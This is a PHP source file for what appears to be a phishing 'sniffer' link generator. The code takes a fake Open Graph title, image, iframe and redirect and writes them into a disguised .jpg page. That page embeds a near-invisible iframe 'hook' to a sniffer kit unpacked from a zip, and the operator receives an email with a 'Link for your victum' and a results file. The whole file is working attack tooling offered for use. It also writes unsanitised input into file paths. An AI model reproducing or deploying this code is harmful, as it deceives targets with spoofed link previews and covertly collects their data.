<form action="snif.php" method="post">
 <p>OG title:<br>  <input type="text" name="text" /></p>
  <p>OG image url :<br> <input type="text" name="image" /></p>
   <p>IFRAME or IMAGE(Optional): <br><input type="text" name="iframe" /></p>
 <p>Redirect(Optional): <br><input type="text" name="redirect" /></p>
 <p>Project name: <br><input type="text" name="html" /></p>
 <p>Email (Optional): <br><input type="text" name="email" /></p>

 <p><input type="submit" /></p>  


Text <?php echo htmlspecialchars($_POST['text']); ?>.<br>  
Link to image <?php echo (int)$_POST['image']; ?>  <br>   
Iframe <?php echo (int)$_POST['iframe']; ?>  <br>
Redirect to <?php echo (int)$_POST['redirect']; ?>  <br>
Sniffer html <?php echo (int)$_POST['html']; ?>  <br>

echo "<h1> Preview </h1>";

Link send to target:<br><a href=<?php echo $path="/i/"; ?>/<?php echo htmlspecialchars($_POST['html']); ?>.jpg>Link</a><br>
Link for information:<br><a href=<?php echo $path="/wbr/"; ?>/<?php echo htmlspecialchars($_POST['html']); ?>/mangol.txt>Link</a><br>
Clean link: <br><a href=<?php echo $path="/wbr/"; ?>/<?php echo htmlspecialchars($_POST['html']); ?>/index.php>Link</a><br>

<br>

<?php

//Config
   $path_full="http://example.com/";
   $path_m="http://example.com/";

   $path_i="i/";
//$path_full="";


  $text = $_POST['text'];
  $image = $_POST['image'];
  $iframe = $_POST['iframe'];
  $redirect = $_POST['redirect'];
  $html = $_POST['html'];
  $hook = "wbr/".$html;
  $email = $_POST['email'];

//html variables

$text_h= ' <meta property="og:title" content="';
$close='">';
$text_f=$text_h.$text.$close;

$image_h= ' <meta property="og:image" content="';
$image_f=$image_h.$image.$close;

$redirect_h='<meta http-equiv="refresh" content="3; url=';
$redirect_f=$redirect_h.$redirect.$close;

$iframe_h='<iframe src="';
$close_iframe=' " style="border:0px #ffffff none;" name="myiFrame" scrolling="no" frameborder="1" marginheight="0px" marginwidth="0px" height="100%" width="100%" allowfullscreen></iframe>';
$iframe_f=$iframe_h.$iframe.$close_iframe;

$hook_h='<iframe src="';
$close2_iframe=' " style="border:0px #ffffff none;" name="myiFrame" scrolling="no" frameborder="1" marginheight="0px" marginwidth="0px" height="1%" width="1%" allowfullscreen></iframe>';
$hook_f=$hook_h.$path_m.$hook.$close2_iframe;

// Шаблон письма
$email_full="Link for your victum: $path_full/$html.jpg Watch Results: $path_m/wbr/$html/mangol.txt";

$myfile = fopen($path_i.$html.".jpg", "w") or die("Unable to open file!");
$txt = $text_f.$image_f.$iframe_f.$hook.$redirect_f.$hook_f;
fwrite($myfile, $txt);
fclose($myfile);

?>


<?php

//if directory exists
$filename = "wbr/".$html;

if (file_exists($filename)) {
    echo '<script type="text/javascript">alert("Please change project name!");</script>';

    die();
} else {
    echo '<script type="text/javascript">alert("Project was created");</script>';
}
?>
   

<?php
mkdir("wbr/".$html, 0700);
$zip_path = "wbr/$html/"; 
$zip = zip_open("wbr.zip");
if ($zip) {
while ($zip_entry = zip_read($zip)) {
$fp = fopen($zip_path.zip_entry_name($zip_entry), "w");   
if (zip_entry_open($zip, $zip_entry, "r")) {
$buf = zip_entry_read($zip_entry, zip_entry_filesize($zip_entry));
fwrite($fp,"$buf");
zip_entry_close($zip_entry);
fclose($fp);
}
}
zip_close($zip);
}
?>


<?php
/**
 * This example shows settings to use when sending via Google's Gmail servers.
 */

//SMTP needs accurate times, and the PHP time zone MUST be set
//This should be done in your php.ini, but this is how to do it if you don't have access to that
date_default_timezone_set('Etc/UTC');

require 'mail//PHPMailerAutoload.php';

//Create a new PHPMailer instance
$mail = new PHPMailer;

//Tell PHPMailer to use SMTP
$mail->isSMTP();

//Enable SMTP debugging
// 0 = off (for production use)
// 1 = client messages
// 2 = client and server messages
$mail->SMTPDebug = 0;

//Ask for HTML-friendly debug output
//$mail->Debugoutput = 'html';

//Set the hostname of the mail server
$mail->Host = 'smtp.gmail.com';
// use
// $mail->Host = gethostbyname('smtp.gmail.com');
// if your network does not support SMTP over IPv6

//Set the SMTP port number - 587 for authenticated TLS, a.k.a. RFC4409 SMTP submission
$mail->Port = 587;

//Set the encryption system to use - ssl (deprecated) or tls
$mail->SMTPSecure = 'tls';

//Whether to use SMTP authentication
$mail->SMTPAuth = true;

//Username to use for SMTP authentication - use full email address for gmail
$mail->Username = "YOUREMAIL@gmail.com";

//Password to use for SMTP authentication
$mail->Password = "YOURPASSWORD";

//Set who the message is to be sent from
$mail->setFrom('YOUREMAIL@gmail.com', 'Worker');

//Set an alternative reply-to address
$mail->addReplyTo('YOUREMAIL@gmail.com', 'Worker');

//Set who the message is to be sent to
$mail->addAddress($email, 'John Doe');
   
//Set the subject line
$mail->Subject = 'Project ' .$html. ' Created';

//Read an HTML message body from an external file, convert referenced images to embedded,
//convert HTML into a basic plain-text alternative body
//$mail->msgHTML(file_get_contents('contents.html'), dirname(__FILE__));
   
//Replace the plain text body with one created manually
$mail->Body = 'Project created: ' .$email_full;


//Attach an image file
//$mail->addAttachment('images/phpmailer_mini.png');

//send the message, check for errors
if (!$mail->send()) {
   // echo "Mailer Error: " . $mail->ErrorInfo;
} else {
    echo "Email with configuration was send";
}
